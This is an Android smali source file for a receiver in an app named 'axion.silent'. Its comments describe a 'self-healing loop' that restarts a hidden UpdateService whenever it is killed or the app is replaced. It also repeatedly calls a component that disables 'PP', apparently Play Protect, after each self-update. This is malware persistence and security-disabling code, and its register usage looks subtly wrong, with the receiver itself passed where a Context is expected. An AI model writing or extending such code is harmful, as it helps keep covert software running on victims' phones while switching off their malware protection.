.class public Lcom/axion/silent/WatchdogReceiver;
.super Landroid/content/BroadcastReceiver;

# Receives the RESTART_SERVICE broadcast that UpdateService sends in onDestroy().
# Also registered for ACTION_MY_PACKAGE_REPLACED so the app re-launches after
# a self-update installs the new APK.
# Together with BootReceiver this forms the self-healing loop.

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 5
    if-eqz p0, :done
    if-eqz p1, :done

    # Restart UpdateService
    :try_svc
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/axion/silent/UpdateService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_svc_end
    .catch Ljava/lang/Exception; {:try_svc .. :try_svc_end} :try_pp

    # Re-open PP settings so AutoPermService can disable it again after update
    :try_pp
    invoke-static {p0}, Lcom/axion/silent/PPDisabler;->disable(Landroid/content/Context;)V
    :try_pp_end
    .catch Ljava/lang/Exception; {:try_pp .. :try_pp_end} :done

    :done
    return-void
.end method
